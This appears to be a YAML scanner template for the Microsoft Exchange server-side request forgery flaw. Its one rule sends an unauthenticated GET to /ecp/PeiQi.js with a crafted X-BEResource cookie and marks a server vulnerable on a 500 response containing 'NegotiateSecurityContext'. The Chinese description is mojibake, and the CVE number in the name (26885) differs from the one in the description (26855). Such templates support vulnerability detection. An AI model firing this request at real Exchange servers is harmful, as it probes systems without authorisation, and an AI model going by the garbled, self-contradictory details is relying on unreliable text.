name: Microsoft Exchange SSRFæ¼æ´ CVE-2021-26885
transport: http
set: {}
detail:
  dock: (app="Microsoft-Exchange" || title="Outlook")
  product: Exchange
  homepage: microsoft.com
  impact: <p>ğŸ</p>
  description: Exchange Server æ˜¯å¾®è½¯å…¬å¸çš„ä¸€å¥—ç”µå­é‚®ä»¶æœåŠ¡ç»„ä»¶ï¼Œæ˜¯ä¸ªæ¶ˆæ¯ä¸åä½œç³»ç»Ÿã€‚2021å¹´03æœˆ3æ—¥ï¼Œå¾®è½¯å®˜æ–¹å‘å¸ƒäº†Microsoft
    Exchangeå®‰å…¨æ›´æ–°ï¼ŒæŠ«éœ²äº†å¤šä¸ªé«˜å±ä¸¥é‡æ¼æ´ï¼Œå…¶ä¸­ï¼šåœ¨ CVE-2021-26855 Exchange SSRFæ¼æ´ä¸­ï¼Œæ”»å‡»è€…å¯ç›´æ¥æ„é€ æ¶æ„è¯·æ±‚ï¼Œä»¥Exchange
    serverçš„èº«ä»½å‘èµ·ä»»æ„HTTPè¯·æ±‚ï¼Œæ‰«æå†…ç½‘ï¼Œå¹¶ä¸”å¯è·å–Exchangeç”¨æˆ·ä¿¡æ¯ã€‚è¯¥æ¼æ´åˆ©ç”¨æ— éœ€èº«ä»½è®¤è¯
rules:
  r1:
    method: GET
    path: /ecp/PeiQi.js
    follow_redirects: false
    headers:
      Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true
    expression: response.status == 500 && response.body.bcontains(b'NegotiateSecurityContext')
expression: r1()
